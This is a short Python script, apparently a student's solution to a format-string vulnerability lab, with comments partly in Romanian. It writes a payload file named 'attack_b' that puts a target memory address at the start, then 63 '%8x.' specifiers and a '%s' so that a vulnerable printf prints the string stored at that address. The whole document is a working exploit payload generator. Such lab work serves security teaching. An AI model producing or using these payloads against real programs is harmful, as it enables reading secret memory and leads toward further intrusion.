#!/usr/bin/python3
import sys

# Initialize the content array
N=64
content = bytearray(0x0 for i in range(N*4+4))
#se pune adresa in codul format
address  = 0x080b4008  #adresa stringului
content[0:4]  =  (address).to_bytes(4,byteorder='little')
#se pun primii 63 de specificatori
s = "%8x."* (N-1)
# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt
#####se pune %s ca fiind al 64 -lea speficator
afisaj = ">>%s"
fmt_afisaj  = (afisaj).encode('latin-1')
content[4+len(fmt): 8 +len(fmt)] = fmt_afisaj
# Write the content to badfile
with open('attack_b', 'wb') as f:
  f.write(content)
